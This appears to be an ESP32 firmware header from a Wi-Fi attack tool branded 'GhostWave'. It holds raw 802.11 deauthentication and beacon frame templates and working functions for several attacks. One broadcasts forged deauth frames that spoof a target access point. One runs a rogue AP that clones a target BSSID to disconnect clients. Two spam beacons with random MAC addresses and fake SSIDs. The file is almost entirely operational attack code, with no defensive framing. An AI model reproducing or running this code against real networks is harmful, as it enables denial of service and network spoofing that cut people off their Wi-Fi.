#pragma once

#include "globals.h"

// ============================================================
// WiFi Frames
// ============================================================
const uint8_t deauth_frame_default[26] PROGMEM = {
   0xC0, 0x00,
   0x00, 0x00,
   0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
   0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
   0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
   0x00, 0x00,
   0x01, 0x00
};

const uint8_t beacon_packet[109] PROGMEM = {
  0x80,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x01,0x02,0x03,0x04,0x05,0x06,
  0x01,0x02,0x03,0x04,0x05,0x06,
  0x00,0x00,
  0x83,0x51,0xf7,0x8f,0x0f,0x00,0x00,0x00,
  0xe8,0x03,
  0x31,0x00,
  0x00,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x01,0x08,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c,
  0x03,0x01,0x01,
  0x30,0x18,0x01,0x00,0x00,0x0f,0xac,0x02,
  0x02,0x00,0x00,0x0f,0xac,0x04,0x00,0x0f,0xac,0x04,
  0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00
};

char wifi_empty_ssid[32];

// ============================================================
// WiFi Attack Functions
// ============================================================
void ensurePromisc() {
  if (!promiscInitialized) {
    esp_wifi_set_promiscuous(true);
    promiscInitialized = true;
  }
}

// Using wifi 43 DoS Attack logic (Combine All: Rogue AP + Broadcast)
void IRAM_ATTR reactiveDeauthSniffer(const uint8_t* payload, int len) {
  // Still keep sniffer to count deauth frames for UI if needed
  if (len >= 26 && payload[0] == 0xC0) deauthPackets++; 
}

void rsnk_attack_method_rogueap(uint8_t* bssid, const char* ssid, uint8_t channel) {
  // Set our AP MAC to the target's BSSID
  esp_wifi_set_mac(WIFI_IF_AP, bssid);
  // Start Rogue AP with max connections = 1, dummy password
  // This causes the ESP Wi-Fi stack to automatically send deauths 
  // to anyone trying to connect or send class 2/3 frames.
  wifi_config_t ap_config = {};
  ap_config.ap.ssid_len = strlen(ssid);
  ap_config.ap.channel = channel;
  ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
  ap_config.ap.max_connection = 1;
  memcpy(ap_config.ap.ssid, ssid, 32);
  memcpy(ap_config.ap.password, "dummypassword", 13);
  
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
}

void rsnk_attack_method_broadcast(uint8_t* bssid) {
  uint8_t pkt[26];
  memcpy(pkt, deauth_frame_default, 26);
  // Destination: Broadcast (FF:FF:FF:FF:FF:FF) setup by default
  // Source: AP BSSID
  memcpy(&pkt[10], bssid, 6);
  // BSSID: AP BSSID
  memcpy(&pkt[16], bssid, 6);

  ensurePromisc();
  for (int i = 0; i < 3; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, false);
  }
  deauthPackets += 3;
}

void wifiBeaconSpamGW() {
  for (int i = 0; i < 32; i++) wifi_empty_ssid[i] = ' ';
  for (int n = 0; n < BEACON_COUNT; n++) {
    uint8_t mac[6];
    for (int j = 0; j < 6; j++) mac[j] = (uint8_t)random(256);
    uint8_t pkt[109];
    memcpy(pkt, beacon_packet, 109);
    memcpy(&pkt[10], mac, 6);
    memcpy(&pkt[16], mac, 6);
    memcpy(&pkt[38], wifi_empty_ssid, 32);
    char ssid[33];
    snprintf(ssid, sizeof(ssid), "GhostWave was here %02d", n+1);
    memcpy(&pkt[38], ssid, strlen(ssid));
    pkt[82] = wifiChannels[wifiChIdx];
    pkt[34] = 0x31;
    ensurePromisc();
    for (int i = 0; i < 3; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
      delay(1);
    }
    digitalWrite(BLUE_LED_PIN, !digitalRead(BLUE_LED_PIN));
  }
  wifiChIdx++;
  if (wifiChIdx >= 3) wifiChIdx = 0;
  esp_wifi_set_channel(wifiChannels[wifiChIdx], WIFI_SECOND_CHAN_NONE);
}

void wifiBeaconRandom() {
  for (int i = 0; i < 32; i++) wifi_empty_ssid[i] = ' ';
  for (int n = 0; n < BEACON_COUNT; n++) {
    uint8_t mac[6];
    for (int j = 0; j < 6; j++) mac[j] = (uint8_t)random(256);
    uint8_t pkt[109];
    memcpy(pkt, beacon_packet, 109);
    memcpy(&pkt[10], mac, 6);
    memcpy(&pkt[16], mac, 6);
    memcpy(&pkt[38], wifi_empty_ssid, 32);
    uint8_t ssid_len = (uint8_t)random(6, 16);
    for (int j = 0; j < ssid_len; j++) {
      pkt[38 + j] = (char)random(0, 255);
    }
    pkt[82] = wifiChannels[wifiChIdx];
    pkt[34] = 0x31;
    ensurePromisc();
    for (int i = 0; i < 3; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
      delay(1);
    }
    digitalWrite(BLUE_LED_PIN, !digitalRead(BLUE_LED_PIN));
  }
  wifiChIdx++;
  if (wifiChIdx >= 3) wifiChIdx = 0;
  esp_wifi_set_channel(wifiChannels[wifiChIdx], WIFI_SECOND_CHAN_NONE);
}
